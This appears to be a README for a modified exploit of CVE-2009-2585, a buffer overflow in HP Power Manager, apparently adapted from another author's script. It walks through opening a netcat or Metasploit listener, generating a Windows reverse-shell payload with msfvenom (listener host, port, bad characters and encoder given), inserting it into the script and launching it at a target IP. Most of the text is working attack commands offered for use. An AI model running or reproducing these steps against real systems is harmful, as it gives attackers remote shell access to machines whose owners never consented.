# CVE2009-2585_HP_Power_Manager_BoF
It is a version modified of the original exploit by Muhammad Haidari (https://raw.githubusercontent.com/Muhammd/HP-Power-Manager/master/hpm_exploit.py). The modification includes a payload which allows to obtain a reverse shell to avoid to open ports in the Windows'target which the firewall's windows will be closed it.

# Usage

At firts, put a listener:
<pre> sudo nc -lvp 443 </pre>

Or using the metasploit module: 
<pre> /exploit/multi/handler with payload: windows/shell_reverse_tcp </pre>

Create the payload:
<pre>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python</pre>

Add the payload to the exploit!

Now, you can launch the exploit:
<pre>python CVE2009-2585_HP_Power_Manager_BoF.py IP </pre>
